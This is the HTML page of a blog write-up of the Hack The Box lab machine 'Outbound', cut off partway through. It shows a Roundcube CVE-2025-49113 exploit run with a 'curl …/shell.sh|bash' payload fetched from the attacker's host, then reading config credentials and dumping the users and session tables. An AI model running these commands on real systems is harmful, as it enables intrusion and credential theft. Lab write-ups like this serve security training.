@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/11/16/hackthebox-outbound/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewOutbound is an easy-difficulty machine from Hack The Box dealing initially with an exposed Roundcube instance vulnerable to CVE-2025-49113 which will allow us to exfiltrate some database crede">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Outbound">
+<meta property="og:url" content="http://fouedsaidi.com/2025/11/16/Hackthebox-Outbound/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewOutbound is an easy-difficulty machine from Hack The Box dealing initially with an exposed Roundcube instance vulnerable to CVE-2025-49113 which will allow us to exfiltrate some database crede">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Outbound/Outbound.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Outbound/r1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Outbound/r2.png">
+<meta property="article:published_time" content="2025-11-15T19:57:04.000Z">
+<meta property="article:modified_time" content="2025-11-15T20:12:51.860Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Outbound/Outbound.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Outbound -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Outbound</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-16 04:57:04</span>
+        <span class="mobile">2025-11-16 04:57:04</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-16 05:12:51</span>
+            <span class="mobile">2025-11-16 05:12:51</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Outbound is an easy-difficulty machine from Hack The Box dealing initially with an exposed Roundcube instance vulnerable to CVE-2025-49113 which will allow us to exfiltrate some database credentials and eventually decrypt a triple DES encryption to get the user password and user flag. We’ll finally abuse CVE-2025-27591 on below binary to get root access.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Outbound/Outbound.png"
+                      alt="Outbound-info-card"
+                ><figcaption>Outbound-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:<span class="built_in">df</span> (ECDSA)</span><br><span class="line">|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:<span class="built_in">df</span>:38:b0 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://mail.outbound.htb/</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.14</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a web application deployed on port 80 that is redirecting us to <code>mail.outbound.htb</code> which we will add as an entry to our <code>/etc/hosts</code> file. </p>
+<h2 id="Web-Application"><a href="#Web-Application" class="headerlink" title="Web Application"></a>Web Application</h2><p>We can see from the access we have that this is <code>Roundcube Webmail 1.6.10</code>. Doing some googling we find this cve for it: <a class="link"   target="_blank" rel="noopener" href="https://github.com/hakaioffsec/CVE-2025-49113-exploit" >https://github.com/hakaioffsec/CVE-2025-49113-exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>We execute it after updating it and we get a reverse shell on system.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/CVE-2025-49113-exploit]</span><br><span class="line">└─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 <span class="string">&#x27;curl 10.10.16.21/shell.sh|bash&#x27;</span></span><br><span class="line">[+] Starting exploit (CVE-2025-49113)...</span><br><span class="line">[*] Checking Roundcube version...</span><br><span class="line">[*] Detected Roundcube version: 10610</span><br><span class="line">[+] Target is vulnerable!</span><br><span class="line">[+] Login successful!</span><br><span class="line">[*] Exploiting...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>As usual, we start by database credentials exfiltration:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/html/roundcube/config</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">config.inc.php</span><br><span class="line">config.inc.php.sample</span><br><span class="line">defaults.inc.php</span><br><span class="line">mimetypes.php</span><br><span class="line">$ <span class="built_in">cat</span> config.inc.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line"> | Local configuration <span class="keyword">for</span> the Roundcube Webmail installation.           |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | This is a sample configuration file only containing the minimum       |</span><br><span class="line"> | setup required <span class="keyword">for</span> a functional installation. Copy more options       |</span><br><span class="line"> | from defaults.inc.php to this file to override the defaults.          |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | This file is part of the Roundcube Webmail client                     |</span><br><span class="line"> | Copyright (C) The Roundcube Dev Team                                  |</span><br><span class="line"> |                                                                       |</span><br><span class="line"> | Licensed under the GNU General Public License version 3 or            |</span><br><span class="line"> | any later version with exceptions <span class="keyword">for</span> skins &amp; plugins.                |</span><br><span class="line"> | See the README file <span class="keyword">for</span> a full license statement.                     |</span><br><span class="line"> +-----------------------------------------------------------------------+</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">// Database connection string (DSN) <span class="keyword">for</span> <span class="built_in">read</span>+write operations</span><br><span class="line">// Format (compatible with PEAR MDB2): db_provider://user:password@host/database</span><br><span class="line">// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle</span><br><span class="line">// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php</span><br><span class="line">// NOTE: <span class="keyword">for</span> SQLite use absolute path (Linux): <span class="string">&#x27;sqlite:////full/path/to/sqlite.db?mode=0646&#x27;</span></span><br><span class="line">//       or (Windows): <span class="string">&#x27;sqlite:///C:/full/path/to/sqlite.db&#x27;</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;db_dsnw&#x27;</span>] = <span class="string">&#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// IMAP host chosen to perform the log-in.</span><br><span class="line">// See defaults.inc.php <span class="keyword">for</span> the option description.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;imap_host&#x27;</span>] = <span class="string">&#x27;localhost:143&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// SMTP server host (<span class="keyword">for</span> sending mails).</span><br><span class="line">// See defaults.inc.php <span class="keyword">for</span> the option description.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;smtp_host&#x27;</span>] = <span class="string">&#x27;localhost:587&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// SMTP username (<span class="keyword">if</span> required) <span class="keyword">if</span> you use %u as the username Roundcube</span><br><span class="line">// will use the current username <span class="keyword">for</span> login</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;smtp_user&#x27;</span>] = <span class="string">&#x27;%u&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// SMTP password (<span class="keyword">if</span> required) <span class="keyword">if</span> you use %p as the password Roundcube</span><br><span class="line">// will use the current user<span class="string">&#x27;s password for login</span></span><br><span class="line"><span class="string">$config[&#x27;</span>smtp_pass<span class="string">&#x27;] = &#x27;</span>%p<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// provide an URL where a user can get support for this Roundcube installation</span></span><br><span class="line"><span class="string">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!</span></span><br><span class="line"><span class="string">$config[&#x27;</span>support_url<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Name your service. This is displayed on the login screen and in the window title</span></span><br><span class="line"><span class="string">$config[&#x27;</span>product_name<span class="string">&#x27;] = &#x27;</span>Roundcube Webmail<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// This key is used to encrypt the users imap password which is stored</span></span><br><span class="line"><span class="string">// in the session record. For the default cipher method it must be</span></span><br><span class="line"><span class="string">// exactly 24 characters long.</span></span><br><span class="line"><span class="string">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS</span></span><br><span class="line"><span class="string">$config[&#x27;</span>des_key<span class="string">&#x27;] = &#x27;</span>rcmail-!24ByteDESkey*Str<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// List of active plugins (in plugins/ directory)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>plugins<span class="string">&#x27;] = [</span></span><br><span class="line"><span class="string">    &#x27;</span>archive<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>zipdownload<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// skin name: folder from skins/</span></span><br><span class="line"><span class="string">$config[&#x27;</span>skin<span class="string">&#x27;] = &#x27;</span>elastic<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>default_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>smtp_server<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>roundcube:RCDBPass2025</code></p>
+<p>We can then use that to dump data from the database itself:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e <span class="string">&#x27;use roundcube;select * from users;&#x27;</span> -E</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             user_id: 1</span><br><span class="line">            username: jacob</span><br><span class="line">           mail_host: localhost</span><br><span class="line">             created: 2025-06-07 13:55:18</span><br><span class="line">          last_login: 2025-07-18 07:00:32</span><br><span class="line">        failed_login: 2025-06-11 07:51:32</span><br><span class="line">failed_login_counter: 1</span><br><span class="line">            language: en_US</span><br><span class="line">         preferences: a:1:&#123;s:11:<span class="string">&quot;client_hash&quot;</span>;s:16:<span class="string">&quot;hpLLqLwmqbyihpi7&quot;</span>;&#125;</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             user_id: 2</span><br><span class="line">            username: mel</span><br><span class="line">           mail_host: localhost</span><br><span class="line">             created: 2025-06-08 12:04:51</span><br><span class="line">          last_login: 2025-06-08 13:29:05</span><br><span class="line">        failed_login: NULL</span><br><span class="line">failed_login_counter: NULL</span><br><span class="line">            language: en_US</span><br><span class="line">         preferences: a:1:&#123;s:11:<span class="string">&quot;client_hash&quot;</span>;s:16:<span class="string">&quot;GCrPGMkZvbsnc3xv&quot;</span>;&#125;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             user_id: 3</span><br><span class="line">            username: tyler</span><br><span class="line">           mail_host: localhost</span><br><span class="line">             created: 2025-06-08 13:28:55</span><br><span class="line">          last_login: 2025-07-18 09:32:22</span><br><span class="line">        failed_login: 2025-07-18 07:10:53</span><br><span class="line">failed_login_counter: 1</span><br><span class="line">            language: en_US</span><br><span class="line">         preferences: a:5:&#123;s:14:<span class="string">&quot;message_extwin&quot;</span>;i:0;s:11:<span class="string">&quot;show_images&quot;</span>;i:2;s:15:<span class="string">&quot;default_charset&quot;</span>;s:5:<span class="string">&quot;UTF-8&quot;</span>;s:11:<span class="string">&quot;client_hash&quot;</span>;s:16:<span class="string">&quot;Bc2TMEKT7ATH6MqF&quot;</span>;i:0;b:0;&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e <span class="string">&#x27;use roundcube;select * from session;&#x27;</span> -E</span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.roundcubeforum.net/index.php?topic=23399.0" >https://www.roundcubeforum.net/index.php?topic=23399.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>in the config.inc.php i found a des_key and auth_key was used. so triple des</p>
+<p>We decrypt that we cyberchef:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Outbound/r1.png"
+                      alt="CyberChef"
+                ><figcaption>CyberChef</figcaption></figure><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Outbound/r2.png"
+                      alt="CyberChef"
+                ><figcaption>CyberChef</figcaption></figure></p>
+<details>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 